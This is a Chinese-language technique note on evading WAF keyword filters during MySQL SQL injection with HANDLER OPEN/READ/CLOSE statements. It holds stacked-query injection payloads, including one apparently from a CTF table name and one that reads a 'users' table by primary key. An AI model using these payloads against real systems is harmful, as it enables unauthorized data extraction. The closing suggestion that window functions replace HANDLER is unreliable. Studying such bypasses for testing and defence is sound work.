# Handler 语句绕过 (Handler Statement Bypass)

## 核心原理

`HANDLER` 是 MySQL 专有的语句，提供对表数据的逐行直接访问通道。它可以替代 `SELECT` 语句实现部分数据读取功能。当 WAF 严格过滤了 `SELECT` 关键词及其编码变体时，`HANDLER ... OPEN / READ / CLOSE` 可能因其非常规性而未被拦截。

## 语法

```sql
HANDLER table_name OPEN [AS alias];
HANDLER handler_name READ { FIRST | NEXT | LAST | index_name { = | <= | >= | < | > } (value_list) } [LIMIT ...] [WHERE condition];
HANDLER handler_name CLOSE;
```

## Payload 模板

```sql
1';HANDLER `1919810931114514` OPEN AS ye;HANDLER ye READ FIRST;HANDLER ye CLOSE;#
```

## 逐段解析

```
1';
```
闭合前面的单引号。

```
HANDLER `1919810931114514` OPEN AS ye;
```
打开目标表的 handler。`AS ye` 为 handler 定义一个别名 `ye`，便于后续引用。表名用反引号包裹是因为名称是纯数字。

```
HANDLER ye READ FIRST;
```
通过 handler 别名 `ye` 读取目标表的第一行数据。`READ FIRST` 返回表的第一行。

```
HANDLER ye CLOSE;
```
关闭 handler 释放资源。

```
#
```
MySQL 注释符。

## 读取选项

| 读取方式 | 说明 |
|---------|------|
| `READ FIRST` | 读取表中的第一行 |
| `READ NEXT` | 依次读取下一行（需循环调用） |
| `READ LAST` | 读取最后一行 |
| `READ index_name = (value)` | 通过索引精确查询 |
| `READ index_name <= (value)` | 通过索引范围查询 |
| `READ index_name LIMIT n` | 限制返回行数 |
| `READ ... WHERE condition` | 条件过滤（MySQL 8.0.14+） |

## 逐行遍历数据

```sql
-- 第一次：打开并读取第一行
1';HANDLER `1919810931114514` OPEN AS a;HANDLER a READ FIRST;#
-- 后续：每次读取下一行
1';HANDLER a READ NEXT;#
-- 最后：关闭
1';HANDLER a CLOSE;#
```

> 注意：同一连接上 handler 保持打开状态，所以后续请求可以继续 `READ NEXT` 直到没有更多行。但在注入场景中，每次请求可能使用不同的连接，因此可能需要先 OPEN 再 READ。

## 通过索引查找

如果知道目标表有索引（如主键 `PRIMARY`），可以：

```sql
1';HANDLER users OPEN AS u;HANDLER u READ `PRIMARY` = (1);#
```

## 适用条件

- MySQL 数据库（`HANDLER` 是 MySQL 专有语法）
- 注入点支持堆叠查询
- WAF 过滤了 `SELECT` 但没有拦截 `HANDLER`
- 表名已知（可通过 information_schema 查询获取）

## 局限性

- 仅适用于 MySQL
- 需要堆叠查询支持
- `HANDLER` 的读取功能相比 `SELECT` 有限——不支持 JOIN、GROUP BY、聚合函数等
- 逐行读取效率低，不适合大数据量提取
- MySQL 8.0+ 对 `HANDLER` 的支持已被逐步弱化（推荐使用窗口函数替代）

---

> **关联技术**：[[预编译绕过]], [[重命名绕过]], [[双写绕过]]
> **参考**：MySQL 官方文档 — HANDLER Statement
